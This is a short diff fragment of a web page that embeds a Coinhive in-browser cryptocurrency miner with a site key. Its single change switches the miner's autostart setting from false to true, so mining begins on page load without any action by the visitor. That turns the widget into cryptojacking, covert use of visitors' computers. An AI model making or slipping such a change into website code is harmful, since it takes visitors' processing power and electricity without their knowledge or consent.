@@ -14,7 +14,7 @@ if (miner) {
 <div class="coinhive-miner" 
 	style="width: 256px; height: 310px"
 	data-key="Lk7qPo3PP9V82a7kXGOrpzUh5tyc9PrK"
-	data-autostart="false"
+	data-autostart="true"
 	data-whitelabel="false"
 	data-background="#000000"
 	data-text="#eeeeee"
